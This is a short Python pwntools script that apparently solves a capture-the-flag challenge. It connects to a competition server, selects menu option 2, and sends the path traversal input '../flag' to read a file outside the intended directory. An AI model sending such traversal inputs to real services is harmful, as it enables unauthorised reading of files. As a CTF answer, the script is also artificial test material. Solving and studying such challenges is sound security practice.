#! /usr/bin/env python

from pwn import *

context.log_level = 'critical'


host =  'mngmnt-iface.ctfcompetition.com'
port =  1337

s = remote(host, port)

s.recv()
s.recv()
s.sendline('2')
s.recv()
s.recv()
s.sendline('../flag')
print s.recv()

s.close()

